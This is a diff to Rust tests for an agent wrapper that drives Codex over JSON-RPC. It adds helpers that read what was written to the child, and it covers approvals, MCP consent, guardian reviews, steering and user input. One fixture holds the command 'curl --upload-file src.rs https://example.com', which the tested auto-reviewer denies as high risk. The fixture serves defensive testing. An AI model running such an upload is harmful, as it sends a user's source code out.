@@ -4466,13 +4466,10 @@ mod tests {
                     .await
                     .unwrap();
                 assert!(matches!(
-                    events.recv().await.unwrap(),
+                    events.try_recv().unwrap(),
                     AgentEvent::TurnAccepted { delivery_id: 7 }
                 ));
-                let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
-                    panic!("native request")
-                };
-                let request: Value = serde_json::from_str(&line).unwrap();
+                let request = sent(&mut actor).await;
                 assert_eq!(request["method"], "turn/start");
                 assert_eq!(request["params"]["approvalPolicy"], policy);
                 assert_eq!(request["params"]["approvalsReviewer"], reviewer);
@@ -4509,7 +4506,7 @@ mod tests {
                     )
                     .await;
                 assert!(
-                    matches!(events.recv().await.unwrap(), AgentEvent::ProviderOptions { selections, .. } if selections == vec![OptionSelection {id:"permissions".into(),value:json!(value)}])
+                    matches!(events.try_recv().unwrap(), AgentEvent::ProviderOptions { selections, .. } if selections == vec![OptionSelection {id:"permissions".into(),value:json!(value)}])
                 );
                 let _ = actor.child.kill();
                 let _ = actor.child.wait();
@@ -4536,10 +4533,7 @@ mod tests {
                 request_permission_profiles(Path::new("/workspace"), &mut actor.stdin, &rx, &mut 3)
                     .await
                     .unwrap();
-            let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
-                panic!("profile request")
-            };
-            let request: Value = serde_json::from_str(&line).unwrap();
+            let request = sent(&mut actor).await;
             assert_eq!(
                 request,
                 json!({"id":3,"method":"permissionProfile/list","params":{"cwd":"/workspace","cursor":null}})
@@ -4627,7 +4621,7 @@ mod tests {
         smol::block_on(async {
             let (mut actor, events) = test_actor();
             actor.handle_line(r#"{"method":"turn/started","params":{"threadId":"thread-1","turn":{"id":"turn-1"}}}"#).await;
-            let _ = events.recv().await.unwrap();
+            let _ = events.try_recv().unwrap();
             for (rpc_id, decision, expected) in [
                 (
                     90,
@@ -4643,7 +4637,7 @@ mod tests {
                 actor.handle_line(&json!({"id":rpc_id,"method":"item/permissions/requestApproval","params":{
                     "threadId":"thread-child","turnId":"turn-child","itemId":"permissions-1","environmentId":null,"startedAtMs":1,"cwd":"/workspace","reason":"Access network","permissions":{"network":{"enabled":true},"fileSystem":null}
                 }}).to_string()).await;
-                let AgentEvent::ApprovalRequested(request) = events.recv().await.unwrap() else {
+                let AgentEvent::ApprovalRequested(request) = events.try_recv().unwrap() else {
                     panic!("native permission request")
                 };
                 assert_eq!(
@@ -4654,7 +4648,7 @@ mod tests {
                         .collect::<Vec<_>>(),
                     vec!["turn", "session", "decline"]
                 );
-                assert!(actor.lines.try_recv().is_err());
+                assert!(written(&mut actor).await.is_empty());
                 actor
                     .handle_command(SessionCommand::RespondApproval {
                         request_id: request.id,
@@ -4662,28 +4656,21 @@ mod tests {
                     })
                     .await
                     .unwrap();
-                let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
-                    panic!("native granted profile")
-                };
-                assert_eq!(
-                    serde_json::from_str::<Value>(&line).unwrap(),
-                    json!({"id":rpc_id,"result":expected})
-                );
+                let mut sent = written(&mut actor).await.into_iter();
+                assert_eq!(sent.next(), Some(json!({"id":rpc_id,"result":expected})));
                 assert!(matches!(
-                    events.recv().await.unwrap(),
+                    events.try_recv().unwrap(),
                     AgentEvent::ApprovalResolved { .. }
                 ));
                 if rpc_id == 91 {
-                    let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
-                        panic!("native interrupt")
-                    };
-                    let request: Value = serde_json::from_str(&line).unwrap();
+                    let request = sent.next().unwrap();
                     assert_eq!(request["method"], "turn/interrupt");
                     assert_eq!(
                         request["params"],
                         json!({"threadId":"thread-child","turnId":"turn-child"})
                     );
                 }
+                assert_eq!(sent.next(), None);
             }
             let _ = actor.child.kill();
             let _ = actor.child.wait();
@@ -4695,7 +4682,7 @@ mod tests {
         smol::block_on(async {
             let (mut actor, events) = test_actor();
             actor.handle_line(r#"{"method":"mcpServer/elicitation/request","id":0,"params":{"threadId":"thread-1","turnId":"turn-1","serverName":"tcode_control","mode":"form","_meta":{"codex_approval_kind":"mcp_tool_call","persist":["session","always"],"tool_description":"Harmless permission probe: return PONG.","tool_params":{},"tool_params_display":[]},"message":"Allow the tcode_control MCP server to run tool \"probe\"?","requestedSchema":{"type":"object","properties":{}}}}"#).await;
-            let AgentEvent::ApprovalRequested(request) = events.recv().await.unwrap() else {
+            let AgentEvent::ApprovalRequested(request) = events.try_recv().unwrap() else {
                 panic!("MCP consent")
             };
             assert_eq!(
@@ -4707,7 +4694,7 @@ mod tests {
                 vec!["accept", "accept:session", "accept:always", "decline"]
             );
             assert!(
-                actor.lines.try_recv().is_err(),
+                written(&mut actor).await.is_empty(),
                 "consent must wait for the user"
             );
             actor
@@ -4717,11 +4704,8 @@ mod tests {
                 })
                 .await
                 .unwrap();
-            let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
-                panic!("consent response")
-            };
             assert_eq!(
-                serde_json::from_str::<Value>(&line).unwrap(),
+                sent(&mut actor).await,
                 json!({"id":0,"result":{"action":"accept","content":{},"_meta":{"persist":"session"}}})
             );
             let config = crate::McpRegistration {
@@ -4755,7 +4739,7 @@ mod tests {
                 "review":{"status":"inProgress","riskLevel":null,"rationale":null},
                 "action":{"type":"command","command":"curl --upload-file src.rs https://example.com","cwd":"/workspace"}
             }}).to_string()).await;
-            let AgentEvent::ItemStarted(item) = events.recv().await.unwrap() else {
+            let AgentEvent::ItemStarted(item) = events.try_recv().unwrap() else {
                 panic!("running review in the timeline")
             };
             assert_eq!(item.id, "review-1");
@@ -4770,7 +4754,7 @@ mod tests {
                 "review":{"status":"denied","riskLevel":"high","userAuthorization":"low","rationale":"Uploads local source"},
                 "action":{"type":"execve","source":"unifiedExec","program":"applyPatch","argv":["inProgress","unifiedExec"],"cwd":"/workspace"}
             }}).to_string()).await;
-            let AgentEvent::ItemCompleted(item) = events.recv().await.unwrap() else {
+            let AgentEvent::ItemCompleted(item) = events.try_recv().unwrap() else {
                 panic!("failed review in the timeline")
             };
             assert_eq!(item.id, "review-1");
@@ -4779,11 +4763,11 @@ mod tests {
                 if name == "Auto-reviewer" && input["targetItemId"] == "command-1"
                 && detail == "Uploads local source\nRisk: high. Command: applyPatch inProgress unifiedExec")
             );
-            let AgentEvent::ApprovalRequested(request) = events.recv().await.unwrap() else {
+            let AgentEvent::ApprovalRequested(request) = events.try_recv().unwrap() else {
                 panic!("explicit guardian override")
             };
             assert_eq!(request.options[0].id, "thread/approveGuardianDeniedAction");
-            assert!(actor.lines.try_recv().is_err());
+            assert!(written(&mut actor).await.is_empty());
             actor
                 .handle_command(SessionCommand::RespondApproval {
                     request_id: request.id.clone(),
@@ -4791,10 +4775,7 @@ mod tests {
                 })
                 .await
                 .unwrap();
-            let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
-                panic!("guardian override")
-            };
-            let native: Value = serde_json::from_str(&line).unwrap();
+            let native = sent(&mut actor).await;
             assert_eq!(native["method"], "thread/approveGuardianDeniedAction");
             assert_eq!(
                 native["params"],
@@ -4807,7 +4788,7 @@ mod tests {
                 .handle_line(&json!({"id":native["id"],"result":{}}).to_string())
                 .await;
             assert!(
-                matches!(events.recv().await.unwrap(),AgentEvent::ApprovalResolved {request_id,..} if request_id==request.id)
+                matches!(events.try_recv().unwrap(),AgentEvent::ApprovalResolved {request_id,..} if request_id==request.id)
             );
             for (review_status, expected_status, action, summary) in [
                 (
@@ -4865,7 +4846,7 @@ mod tests {
                     "only denied reviews offer an override"
                 );
                 assert!(
-                    actor.lines.try_recv().is_err(),
+                    written(&mut actor).await.is_empty(),
                     "a verdict does not approve an action"
                 );
             }
@@ -5016,6 +4997,33 @@ mod tests {
         )
     }
 
+    /// Everything Tcode wrote to Codex since the last call, in order. The
+    /// echo child returns lines in the order they were written, so a marker
+    /// written now comes back after all of them.
+    async fn written(actor: &mut Actor) -> Vec<Value> {
+        let marker = json!({"tcode_test_marker": true});
+        send_json(&mut actor.stdin, &marker).unwrap();
+        let mut written = Vec::new();
+        loop {
+            let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
+                panic!("the echo child stopped");
+            };
+            let message: Value = serde_json::from_str(&line).unwrap();
+            if message == marker {
+                return written;
+            }
+            written.push(message);
+        }
+    }
+
+    /// The one message Tcode wrote to Codex since the last read.
+    async fn sent(actor: &mut Actor) -> Value {
+        let written = written(actor).await;
+        let [message] = <[Value; 1]>::try_from(written)
+            .unwrap_or_else(|written| panic!("expected one message, got {written:?}"));
+        message
+    }
+
     /// A moved thread's next `turn/start` names the directory it moved to, and so does
     /// every one after it until Codex starts a turn there: a refused request moved nothing.
     #[test]
@@ -5039,14 +5047,8 @@ mod tests {
                     .await
                     .unwrap();
                 // A refused request's failure reports come first.
-                while !matches!(
-                    events.recv().await.unwrap(),
-                    AgentEvent::TurnAccepted { .. }
-                ) {}
-                let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
-                    panic!("native request")
-                };
-                serde_json::from_str::<Value>(&line).unwrap()
+                while !matches!(events.try_recv().unwrap(), AgentEvent::TurnAccepted { .. }) {}
+                sent(actor).await
             };
             let refused = turn_start(&mut actor, 1).await;
             assert_eq!(
@@ -5115,10 +5117,7 @@ mod tests {
                 (SessionCommand::Compact, "thread/compact/start", None),
             ] {
                 actor.handle_command(command).await.unwrap();
-                let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
-                    panic!("expected echoed request")
-                };
-                let request: Value = serde_json::from_str(&request).unwrap();
+                let request = sent(&mut actor).await;
                 assert_eq!(request["method"], method);
                 assert_eq!(request["params"]["threadId"], "thread-1");
                 if let Some(field) = field {
@@ -5163,10 +5162,7 @@ mod tests {
                 ),
             ] {
                 actor.handle_command(command).await.unwrap();
-                let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
-                    panic!("expected echoed request")
-                };
-                let request: Value = serde_json::from_str(&request).unwrap();
+                let request = sent(&mut actor).await;
                 assert_eq!(request["method"], expected["method"]);
                 assert_eq!(request["params"], expected["params"]);
             }
@@ -5336,10 +5332,7 @@ mod tests {
                     })
                     .await
                     .unwrap();
-                let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
-                    panic!("native request")
-                };
-                let request: Value = serde_json::from_str(&line).unwrap();
+                let request = sent(&mut actor).await;
                 assert_eq!(request["method"], "turn/start");
                 assert_eq!(
                     request["params"]["additionalContext"],
@@ -5356,10 +5349,7 @@ mod tests {
             actor
                 .handle_line(r#"{"method":"item/completed","params":{"threadId":"thread-1","item":{"type":"contextCompaction","id":"compaction"}}}"#)
                 .await;
-            let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
-                panic!("native request")
-            };
-            let request: Value = serde_json::from_str(&line).unwrap();
+            let request = sent(&mut actor).await;
             assert_eq!(request["method"], "thread/inject_items");
             assert_eq!(
                 request["params"],
@@ -5457,7 +5447,7 @@ mod tests {
                 .await;
             // The listing text is not an answer; the transcript keeps the call.
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::ItemCompleted(ThreadItem {
                     content: ItemContent::ToolCall { ref name, ref input, .. },
                     ..
@@ -5468,7 +5458,7 @@ mod tests {
                 request_id,
                 questions,
                 delivery,
-            } = events.recv().await.unwrap()
+            } = events.try_recv().unwrap()
             else {
                 panic!("expected UserInputRequested")
             };
@@ -5499,19 +5489,16 @@ mod tests {
                 .await
                 .unwrap();
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::SteerRequested { ref request_id, ref text, .. }
                     if request_id == "codex-question-reply-call_q"
                         && text == "> Which DB?\n\nSQLite"
             ));
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::UserInputResolved { ref request_id, .. } if request_id == "call_q"
             ));
-            let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
-                panic!("expected echoed request")
-            };
-            let request: Value = serde_json::from_str(&request).unwrap();
+            let request = sent(&mut actor).await;
             assert_eq!(request["method"], "turn/steer");
             assert_eq!(request["params"]["expectedTurnId"], "turn-1");
             let envelope = "<send_user_message_question_reply>\n\
@@ -5533,7 +5520,7 @@ mod tests {
                 )
                 .await;
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::SteerAccepted { ref request_id } if request_id == "codex-question-reply-call_q"
             ));
 
@@ -5544,22 +5531,22 @@ mod tests {
                 }}}).to_string())
                 .await;
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::ItemCompleted(_)
             ));
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::UserInputRequested { ref request_id, .. } if request_id == "call_r"
             ));
             actor
                 .handle_line(&json!({"method":"turn/completed","params":{"threadId":"thread-1","turn":{"id":"turn-1","status":"completed"}}}).to_string())
                 .await;
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::TurnCompleted { .. }
             ));
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::TurnCheckpoint { .. }
             ));
             let mut answers = serde_json::Map::new();
@@ -5575,7 +5562,7 @@ mod tests {
                 .await
                 .unwrap();
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::Warning { .. }
             ));
             assert!(events.try_recv().is_err());
@@ -5598,10 +5585,7 @@ mod tests {
                 })
                 .await
                 .unwrap();
-            let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
-                panic!("expected echoed request")
-            };
-            let request: Value = serde_json::from_str(&request).unwrap();
+            let request = sent(&mut actor).await;
             let id = request["id"].as_i64().unwrap();
             actor
                 .handle_line(&json!({"id": id, "result": {"turnId": "turn-1"}}).to_string())
@@ -5628,7 +5612,7 @@ mod tests {
                     .await;
             }
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::SteerAccepted { ref request_id } if request_id == "steer-ok"
             ));
             assert!(
@@ -5644,10 +5628,7 @@ mod tests {
                 })
                 .await
                 .unwrap();
-            let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
-                panic!("expected echoed request")
-            };
-            let request: Value = serde_json::from_str(&request).unwrap();
+            let request = sent(&mut actor).await;
             let id = request["id"].as_i64().unwrap();
             actor
                 .handle_line(
@@ -5656,7 +5637,7 @@ mod tests {
                 )
                 .await;
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::SteerRejected { ref request_id } if request_id == "steer-error"
             ));
             actor
@@ -5687,11 +5668,11 @@ mod tests {
                 .handle_line(&json!({"method":"turn/completed","params":{"threadId":"thread-1","turn":{"id":"turn-1","status":"completed"}}}).to_string())
                 .await;
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::TurnCompleted { .. }
             ));
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::TurnCheckpoint { .. }
             ));
             actor
@@ -5703,11 +5684,11 @@ mod tests {
                 .await
                 .unwrap();
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::SteerRejected { ref request_id } if request_id == "steer-late"
             ));
             assert!(
-                actor.lines.try_recv().is_err(),
+                written(&mut actor).await.is_empty(),
                 "no turn/steer request is written without an active turn"
             );
 
@@ -5734,13 +5715,10 @@ mod tests {
                 .await
                 .unwrap();
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::TurnAccepted { delivery_id: 7 }
             ));
-            let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
-                panic!("expected echoed turn/start request")
-            };
-            let request: Value = serde_json::from_str(&request).unwrap();
+            let request = sent(&mut actor).await;
             let id = request["id"].as_i64().unwrap();
             actor
                 .handle_line(
@@ -5749,11 +5727,11 @@ mod tests {
                 )
                 .await;
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::Error { fatal: false, .. }
             ));
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::TurnCompleted {
                     status: TurnStatus::Failed,
                     ..
@@ -5770,11 +5748,8 @@ mod tests {
                 })
                 .await
                 .unwrap();
-            let _ = events.recv().await.unwrap(); // TurnAccepted
-            let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
-                panic!("expected echoed turn/start request")
-            };
-            let request: Value = serde_json::from_str(&request).unwrap();
+            let _ = events.try_recv().unwrap(); // TurnAccepted
+            let request = sent(&mut actor).await;
             let id = request["id"].as_i64().unwrap();
             actor.active_turn = Some("turn-live".into());
             actor
@@ -5784,7 +5759,7 @@ mod tests {
                 )
                 .await;
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::Error { .. }
             ));
             assert!(
@@ -6008,16 +5983,13 @@ mod tests {
                 .handle_command(SessionCommand::ReadAccountUsage { reply })
                 .await
                 .unwrap();
-            let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
-                panic!("missing usage request")
-            };
-            let request: Value = serde_json::from_str(&request).unwrap();
+            let request = sent(&mut actor).await;
             assert_eq!(request["method"], "account/rateLimits/read");
             let result = json!({"rateLimits": {"planType": "pro"}});
             actor
                 .handle_line(&json!({"id": request["id"], "result": result}).to_string())
                 .await;
-            assert_eq!(answer.recv().await.unwrap().unwrap(), result);
+            assert_eq!(answer.try_recv().unwrap().unwrap(), result);
         });
     }
 
@@ -6025,12 +5997,6 @@ mod tests {
     fn background_terminals_are_listed_read_again_and_stopped() {
         smol::block_on(async {
             let (mut actor, events) = test_actor();
-            let next_request = async |actor: &mut Actor| {
-                let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
-                    panic!("missing request")
-                };
-                serde_json::from_str::<Value>(&request).unwrap()
-            };
             let answer = async |actor: &mut Actor, request: &Value, result: Value| {
                 let response = json!({"id": request["id"], "result": result}).to_string();
                 actor.handle_line(&response).await;
@@ -6045,7 +6011,7 @@ mod tests {
             while events.try_recv().is_ok() {}
             actor.background_terminal_read = Some(std::time::Instant::now());
             actor.wake().await.unwrap();
-            let list = next_request(&mut actor).await;
+            let list = sent(&mut actor).await;
             assert_eq!(list["method"], "thread/backgroundTerminals/list");
             assert_eq!(list["params"], json!({"threadId": "thread-1"}));
             // Recorded from 0.167.0.
@@ -6085,7 +6051,7 @@ mod tests {
 
             actor.background_terminal_read = Some(std::time::Instant::now());
             actor.wake().await.unwrap();
-            let again = next_request(&mut actor).await;
+            let again = sent(&mut actor).await;
             answer(&mut actor, &again, running).await;
             assert!(events.try_recv().is_err(), "an unchanged list says nothing");
 
@@ -6095,7 +6061,7 @@ mod tests {
                 })
                 .await
                 .unwrap();
-            let terminate = next_request(&mut actor).await;
+            let terminate = sent(&mut actor).await;
             assert_eq!(terminate["method"], "thread/backgroundTerminals/terminate");
             assert_eq!(
                 terminate["params"],
@@ -6103,7 +6069,7 @@ mod tests {
             );
             answer(&mut actor, &terminate, json!({"terminated": true})).await;
 
-            let list = next_request(&mut actor).await;
+            let list = sent(&mut actor).await;
             assert_eq!(list["method"], "thread/backgroundTerminals/list");
             answer(&mut actor, &list, json!({"data":[],"nextCursor":null})).await;
             assert!(actor.background_terminal_read.is_none());
@@ -6120,7 +6086,7 @@ mod tests {
                 .handle_command(SessionCommand::StopBackgroundTask { task_id: None })
                 .await
                 .unwrap();
-            let clean = next_request(&mut actor).await;
+            let clean = sent(&mut actor).await;
             assert_eq!(clean["method"], "thread/backgroundTerminals/clean");
             assert_eq!(clean["params"], json!({"threadId": "thread-1"}));
             let refusal =
@@ -6135,7 +6101,7 @@ mod tests {
                 ),
                 "a refused stop says why"
             );
-            let list = next_request(&mut actor).await;
+            let list = sent(&mut actor).await;
             assert_eq!(list["method"], "thread/backgroundTerminals/list");
             let _ = actor.child.kill();
             let _ = actor.child.wait();
@@ -6244,10 +6210,7 @@ mod tests {
                         .await
                         .unwrap();
                 }
-                let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
-                    panic!("missing continuation")
-                };
-                let request: Value = serde_json::from_str(&request).unwrap();
+                let request = sent(&mut actor).await;
                 assert_eq!(request["method"], "turn/start");
                 assert_eq!(request["params"]["threadId"], "thread-1");
                 assert_eq!(request["params"]["input"], json!([]));
@@ -6256,7 +6219,7 @@ mod tests {
                     .handle_command(SessionCommand::RetryTurn { turn_id })
                     .await
                     .unwrap();
-                assert!(actor.lines.try_recv().is_err());
+                assert!(written(&mut actor).await.is_empty());
                 actor.handle_line(&json!({"id":request["id"], "result":{"turn":{"id":format!("capacity-{}",attempt + 1)}}}).to_string()).await;
             }
             actor
@@ -6266,13 +6229,7 @@ mod tests {
             actor
                 .handle_notification("turn/started", &json!({"turn":{"id":"capacity-5"}}))
                 .await;
-            let ChildOutput::Line(interrupt) = actor.lines.recv().await.unwrap() else {
-                panic!("missing interrupt")
-            };
-            assert_eq!(
-                serde_json::from_str::<Value>(&interrupt).unwrap()["method"],
-                "turn/interrupt"
-            );
+            assert_eq!(sent(&mut actor).await["method"], "turn/interrupt");
             let _ = actor.child.kill();
             let _ = actor.child.wait();
         });
@@ -6313,7 +6270,7 @@ mod tests {
                 })
                 .await
                 .unwrap();
-            assert!(actor.lines.try_recv().is_err());
+            assert!(written(&mut actor).await.is_empty());
             let _ = actor.child.kill();
             let _ = actor.child.wait();
         });
@@ -6334,7 +6291,7 @@ mod tests {
                 )
                 .await;
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::ServedModel { model, reason }
                     if model == "gpt-5-mini" && reason.as_deref() == Some("capacity")
             ));
@@ -6366,7 +6323,7 @@ mod tests {
                 .await;
 
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::TurnChangesUpdated {
                     turn_id,
                     completeness: ChangeCompleteness::Exact,
@@ -6392,7 +6349,7 @@ mod tests {
                 )
                 .await;
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::ItemStarted(ThreadItem {
                     content: ItemContent::Plan { .. },
                     ..
@@ -6405,11 +6362,11 @@ mod tests {
                 )
                 .await;
             assert!(
-                matches!(events.recv().await.unwrap(), AgentEvent::Delta { kind: DeltaKind::AssistantText, text, .. } if text == "# Native plan")
+                matches!(events.try_recv().unwrap(), AgentEvent::Delta { kind: DeltaKind::AssistantText, text, .. } if text == "# Native plan")
             );
             actor.handle_notification("item/completed", &json!({"item": {"type": "plan", "id": "native-plan", "text": "# Final native plan"}})).await;
             assert!(
-                matches!(events.recv().await.unwrap(), AgentEvent::ItemCompleted(ThreadItem { content: ItemContent::Plan { markdown }, .. }) if markdown == "# Final native plan")
+                matches!(events.try_recv().unwrap(), AgentEvent::ItemCompleted(ThreadItem { content: ItemContent::Plan { markdown }, .. }) if markdown == "# Final native plan")
             );
             let _ = actor.child.kill();
             let _ = actor.child.wait();
@@ -6435,7 +6392,7 @@ mod tests {
                     }),
                 )
                 .await;
-            match events.recv().await.unwrap() {
+            match events.try_recv().unwrap() {
                 AgentEvent::PlanUpdated {
                     turn_id,
                     explanation,
@@ -6493,7 +6450,7 @@ mod tests {
                 )
                 .await;
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::ItemUpdated(ThreadItem {
                     id,
                     parent_item_id: None,
@@ -6515,7 +6472,7 @@ mod tests {
                 )
                 .await;
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::ItemCompleted(ThreadItem { id, content: ItemContent::Subagent { status: ItemStatus::Completed, .. }, .. })
                     if id == "call_spawn"
             ));
@@ -6651,10 +6608,7 @@ mod tests {
                     ),
                     "unknown child metadata must not borrow the parent's model: {event:?}"
                 );
-                let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
-                    panic!("expected thread metadata request");
-                };
-                let request: Value = serde_json::from_str(&request).unwrap();
+                let request = sent(&mut actor).await;
                 assert_eq!(request["method"], "thread/read");
                 assert_eq!(
                     request["params"],
@@ -6751,7 +6705,7 @@ mod tests {
             actor.handle_notification("item/started", &started).await;
             // Keep the explicit effort while the child's model is still unknown.
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::ItemUpdated(ThreadItem {
                     id,
                     content: ItemContent::Subagent {
@@ -6793,7 +6747,7 @@ mod tests {
             }});
             actor.handle_notification("item/started", &completed).await;
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::ItemCompleted(ThreadItem {
                     id,
                     parent_item_id: None,
@@ -6819,7 +6773,7 @@ mod tests {
                 .handle_notification("item/started", &interrupted)
                 .await;
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::ItemCompleted(ThreadItem {
                     id,
                     content: ItemContent::Subagent {
@@ -6962,7 +6916,7 @@ mod tests {
                 let AgentEvent::ItemCompleted(ThreadItem {
                     content: ItemContent::ImageRead { image, .. },
                     ..
-                }) = events.recv().await.unwrap()
+                }) = events.try_recv().unwrap()
                 else {
                     panic!("image read");
                 };
@@ -6975,7 +6929,7 @@ mod tests {
             let AgentEvent::ItemCompleted(ThreadItem {
                 content: ItemContent::ImageRead { image, .. },
                 ..
-            }) = events.recv().await.unwrap()
+            }) = events.try_recv().unwrap()
             else {
                 panic!("image read");
             };
@@ -7205,7 +7159,7 @@ mod tests {
                 )
                 .await;
 
-            match events.recv().await.unwrap() {
+            match events.try_recv().unwrap() {
                 AgentEvent::UserInputRequested {
                     request_id,
                     questions,
@@ -7239,13 +7193,10 @@ mod tests {
                 .unwrap();
 
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::UserInputResolved { ref request_id, .. } if request_id == "55"
             ));
-            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
-                panic!("expected echoed response")
-            };
-            let response: Value = serde_json::from_str(&response).unwrap();
+            let response = sent(&mut actor).await;
             assert_eq!(response["id"], 55);
             assert_eq!(
                 response["result"]["answers"]["os"]["answers"],
@@ -7309,7 +7260,7 @@ mod tests {
                 request_id,
                 questions,
                 ..
-            } = events.recv().await.unwrap()
+            } = events.try_recv().unwrap()
             else {
                 panic!("expected UserInputRequested")
             };
@@ -7377,13 +7328,10 @@ mod tests {
                 .await
                 .unwrap();
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::UserInputResolved { ref request_id, .. } if request_id == "81"
             ));
-            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
-                panic!("expected echoed response")
-            };
-            let response: Value = serde_json::from_str(&response).unwrap();
+            let response = sent(&mut actor).await;
             assert_eq!(
                 response,
                 json!({
@@ -7438,7 +7386,7 @@ mod tests {
                 )
                 .await;
 
-            let AgentEvent::UserInputRequested { questions, .. } = events.recv().await.unwrap()
+            let AgentEvent::UserInputRequested { questions, .. } = events.try_recv().unwrap()
             else {
                 panic!("expected UserInputRequested")
             };
@@ -7476,11 +7424,8 @@ mod tests {
                 })
                 .await
                 .unwrap();
-            let _ = events.recv().await.unwrap();
-            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
-                panic!("expected echoed response")
-            };
-            let response: Value = serde_json::from_str(&response).unwrap();
+            let _ = events.try_recv().unwrap();
+            let response = sent(&mut actor).await;
             assert_eq!(
                 response,
                 json!({
@@ -7520,7 +7465,7 @@ mod tests {
                     .to_string(),
                 )
                 .await;
-            let _ = events.recv().await.unwrap();
+            let _ = events.try_recv().unwrap();
 
             let mut answers = serde_json::Map::new();
             answers.insert("count".into(), json!("not-a-number"));
@@ -7531,11 +7476,8 @@ mod tests {
                 })
                 .await
                 .unwrap();
-            let _ = events.recv().await.unwrap();
-            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
-                panic!("expected echoed response")
-            };
-            let response: Value = serde_json::from_str(&response).unwrap();
+            let _ = events.try_recv().unwrap();
+            let response = sent(&mut actor).await;
             assert_eq!(response, json!({"id": 82, "result": {"action": "decline"}}));
             assert!(response["result"].get("content").is_none());
 
@@ -7569,7 +7511,7 @@ mod tests {
                         .to_string(),
                     )
                     .await;
-                let AgentEvent::UserInputRequested { questions, .. } = events.recv().await.unwrap()
+                let AgentEvent::UserInputRequested { questions, .. } = events.try_recv().unwrap()
                 else {
                     panic!("expected UserInputRequested")
                 };
@@ -7590,11 +7532,8 @@ mod tests {
                     })
                     .await
                     .unwrap();
-                let _ = events.recv().await.unwrap();
-                let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
-                    panic!("expected echoed response")
-                };
-                let response: Value = serde_json::from_str(&response).unwrap();
+                let _ = events.try_recv().unwrap();
+                let response = sent(&mut actor).await;
                 assert_eq!(response["result"]["action"], action);
                 assert!(response["result"].get("content").is_none());
             }
@@ -7626,14 +7565,11 @@ mod tests {
                 .await;
 
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::Warning { ref message }
                     if message.contains("opaque") && message.contains("openai/form")
             ));
-            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
-                panic!("expected echoed response")
-            };
-            let response: Value = serde_json::from_str(&response).unwrap();
+            let response = sent(&mut actor).await;
             assert_eq!(response["result"]["action"], "decline");
             assert!(response.get("result").is_some());
             assert!(response.get("error").is_none());
@@ -7667,18 +7603,15 @@ mod tests {
                     .to_string(),
                 )
                 .await;
